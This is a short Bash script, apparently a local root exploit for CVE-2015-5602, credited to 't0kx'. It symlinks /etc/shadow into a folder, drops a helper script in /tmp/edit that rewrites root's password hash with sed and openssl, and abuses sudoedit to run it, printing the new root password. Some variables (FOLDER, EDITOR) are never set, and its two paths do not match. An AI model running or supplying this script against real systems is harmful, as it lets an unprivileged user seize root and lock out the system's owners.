export PASSWD=$(printf ${RANDOM} \
		| md5sum \
		| awk '{print $1}')

prepare() {
cat << EOF >> /tmp/edit
#!/usr/bin/env bash
pass="$(printf "%q" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))"
sed -i -e  "s,^root:[^:]\+:,root:\${pass}:," \${1}
EOF
}

main() {
	printf "[+] CVE-2015-5602 exploit by t0kx\n"
	printf "[+] Creating folder...\n"
	mkdir -p /var/www/ieee/${FOLDER}/
	printf "[+] Creating symlink\n"
	ln -sf /etc/shadow /var/www/ieee/${FOLDER}/esc.txt
	printf "[+] Modify EDITOR...\n"
	prepare && chmod +x ${EDITOR}
	printf "[+] Change root password to: ${PASSWD}\n"
	sudoedit /home/${USER}/${FOLDER}/esc.txt
	printf "[+] Done\n"
}; main
